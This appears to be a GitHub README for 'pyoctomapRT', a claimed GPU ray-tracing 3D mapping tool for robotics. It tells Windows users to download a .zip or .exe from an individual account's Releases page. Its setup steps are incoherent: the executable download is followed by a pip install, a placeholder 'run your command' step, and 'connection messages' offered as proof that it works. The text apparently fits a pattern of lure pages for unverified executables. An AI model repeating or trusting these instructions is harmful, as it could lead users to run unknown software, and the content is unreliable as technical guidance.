# 🗺️ pyoctomapRT - Map your world quickly with GPU

[![](https://img.shields.io/badge/Download_Software-Blue.svg)](https://github.com/nicoleravenous266/pyoctomapRT)

pyoctomapRT creates 3D maps from sensor data. It uses your computer graphics card to perform these tasks. This approach makes map creation faster than standard methods. You can use this software as a direct replacement for existing mapping tools. It supports robotics and computer vision tasks.

## ⚙️ System Requirements

Your computer needs specific parts to run this software. Check your system against this list before you start.

- Operating System: Windows 10 or Windows 11.
- Graphics Card: NVIDIA GPU with support for OptiX. 
- GPU Memory: At least 4GB of video memory.
- Drivers: Latest NVIDIA graphics drivers installed.
- Python: Version 3.9 or newer.

Ensure your graphics drivers come directly from the NVIDIA website. Older drivers may cause errors during the mapping process.

## 📥 How to Download 

Visit this page to download: [https://github.com/nicoleravenous266/pyoctomapRT](https://github.com/nicoleravenous266/pyoctomapRT)

1. Open the link in your web browser. 
2. Look for the Releases section on the right side of the screen.
3. Click the latest version number.
4. Find the file ending in .zip or .exe under the Assets heading.
5. Save the file to your computer.

## 🚀 Setting Up Your Computer

Follow these steps to prepare your system for the mapping software.

### Prepare Python
You need a tool called Python to run the software. Most computers do not have this installed by default. 

1. Go to the official Python website.
2. Download the installer for Windows.
3. Run the installer file.
4. Check the box that says "Add Python to PATH" before you click install. This step is important for your computer to find the software.

### Install Graphics Drivers
The software relies on your NVIDIA graphics card. 

1. Open the NVIDIA GeForce Experience app or visit the NVIDIA website.
2. Search for your specific graphics card model.
3. Download the driver update.
4. Restart your computer after the update finishes.

## 🛠️ Running the Software

Once you finish the setup, you can launch the program.

1. Unzip the folder you downloaded from the website.
2. Open the command prompt on your Windows computer. Type "cmd" in the start menu search bar to find it.
3. Change the directory to the folder where you saved the software. Type `cd` followed by the folder path.
4. Type `pip install pyoctomaprt` and press enter to finish the installation.
5. Create a new folder for your project data.
6. Run your command to start the mapping process.

If you see a screen showing connection messages, the software works correctly.

## 📈 Improving Performance

Mapping uses a lot of computer power. Follow these tips to keep the process smooth.

- Close other heavy programs like video games or web browsers while you map. This leaves more power for the graphics card.
- Keep your laptop plugged into a wall outlet. Battery power often slows down the graphics processor.
- Store your map files on a solid-state drive (SSD). This drive reads and writes data much faster than older hard disks.

## 🔍 Troubleshooting Common Issues

Errors happen sometimes. Follow these steps to fix simple problems.

- If the program stops, check if your graphics card reaches its memory limit. Reduce the resolution of your incoming data to lower the load.
- If you see a "CUDA error," your drivers are likely out of date. Reinstall the latest version from the NVIDIA website.
- If the computer does not recognize the command, verify that "Add Python to PATH" was selected during the Python installation. If you missed it, run the installer again as a repair.
- Check the folder permissions. Ensure your user account owns the files in the directory.

## 📋 Features

The software provides several core functions for mapping.

- Ray-tracing support: Uses light physics to measure distances accurately.
- Real-time processing: Updates the map as your drone or robot moves.
- GPU acceleration: Offloads work from your main processor to the graphics card to save time.
- Standard compatibility: Works with common point cloud data formats used in robotics.
- Memory management: Clears unused blocks in the map automatically to keep performance steady.

## 🌐 Project Context

This software fits into the field of robotics and 3D vision. It handles volumetric mapping, which means it tracks space in three dimensions rather than just a flat image. Researchers and engineers use this to help autonomous machines understand their physical environment. The use of ray-tracing technology creates a precise model of boundaries and obstacles. This makes the tool reliable for complex navigation tasks.